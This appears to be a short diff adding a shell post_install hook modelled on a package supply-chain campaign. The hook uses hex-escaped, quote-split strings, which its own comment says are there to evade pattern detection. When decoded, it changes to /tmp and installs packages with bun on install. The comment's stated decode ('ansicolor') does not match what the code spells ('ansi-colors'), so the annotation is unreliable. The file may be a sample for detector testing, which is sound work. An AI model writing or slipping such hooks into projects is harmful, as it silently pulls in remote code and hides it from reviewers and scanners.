@@ -1,0 +1,7 @@
+# nextfile-js obfuscated campaign style install hook
+# Uses hex-escaped and quote-split obfuscation to evade pattern detection.
+# Decodes to: cd /tmp && bun add ansicolor nextfile-js
+
+post_install() {
+  $'\x63'"d" "/"'t'"m"'p' && "b"'u''n' 'a'"d"'d' $'\141\x6e''s'"i""-"$'\143''o''l''o''r'$'\x73' 'n'"e"'x'"t""f"'i''l''e''-''j''s'
+}
